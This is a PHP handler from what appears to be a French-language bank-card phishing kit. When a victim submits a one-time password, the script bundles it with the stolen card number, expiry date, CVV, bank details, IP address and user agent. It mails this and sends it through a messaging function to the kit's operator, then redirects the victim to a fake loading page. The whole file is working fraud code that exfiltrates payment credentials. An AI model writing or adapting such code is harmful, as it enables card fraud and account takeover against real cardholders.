<?php
include '../../settings.php';
include '../core/funcs.php';
session_start();

if (isset($_POST['otp'])) {
    $_SESSION['otp'] = $_POST['otp'];
    $message = "<strong>[+1 Nouvel OTP : ".$_SESSION['otp']."]</strong>
    
🔧 OTP : <pre>".$_SESSION['otp']."</pre>
    
🔧 Numéro de carte : <pre>".$_SESSION['cc']."</pre>
🔧 Date d'expiration : <pre>".$_SESSION['exp']."</pre>
🔧 CVV : <pre>".$_SESSION['cvv']."</pre>
      
🔧 Level : <pre>".$level."</pre>
🔧 Banque : <pre>".$bank."</pre>
🔧 Type : <pre>".$type."</pre>

🔧 Adresse IP : ".$_SERVER['REMOTE_ADDR']."
🔧 User Agent :" . $_SERVER['HTTP_USER_AGENT'];
    sendMailRez($email,"㊙️ + 1 OTP : [".$_SESSION['otp']."] ㊙️",$message);
    sendMessage($message, True);
    change($_SERVER['REMOTE_ADDR'], '');
    header('location: ../loading.php?page=loading.php');
    
}